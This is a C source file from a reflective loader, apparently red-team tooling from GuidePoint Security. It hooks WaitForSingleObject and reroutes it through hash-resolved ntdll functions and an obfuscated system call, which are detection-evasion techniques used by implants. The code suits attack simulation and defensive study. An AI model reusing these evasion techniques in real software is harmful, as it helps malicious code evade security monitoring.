/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack SimulatioN
 *
**/

#include "Common.h"

typedef struct
{
	D_API( RtlNtStatusToDosError );
	D_API( NtWaitForSingleObject );
	D_API( RtlSetLastWin32Error );
} API ;

/* API Hashes */
#define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890 /* RtlNtStatusToDosError */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLSETLASTWIN32ERROR	0xfd303374 /* RtlSetLastWin32Error */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Awaits an object to be signaled before returning
 * a result.
 *
!*/
D_SEC( D ) DWORD WINAPI WaitForSingleObject_Hook( _In_ HANDLE Handle, _In_ DWORD Timeout )
{
	API		Api;
	LARGE_INTEGER	Del;

	PVOID		Arg[ 3 ];
	NTSTATUS	Nst = STATUS_UNSUCCESSFUL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );

	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );

	if ( Timeout != INFINITE ) {
		Del.QuadPart = Timeout * -10000LL;
		Arg[0] = C_PTR( Handle );
		Arg[1] = C_PTR( FALSE );
		Arg[2] = C_PTR( &Del );
		Nst = ObfSystemCall( Api.NtWaitForSingleObject, Arg, ARRAYSIZE( Arg ) );
	} else {
		Arg[0] = C_PTR( Handle );
		Arg[1] = C_PTR( FALSE );
		Arg[2] = C_PTR( NULL );
		Nst = ObfSystemCall( Api.NtWaitForSingleObject, Arg, ARRAYSIZE( Arg ) );
	};
	if ( ! NT_SUCCESS( Nst ) ) {
		Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
		Nst = WAIT_FAILED;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );

	return Nst;
};
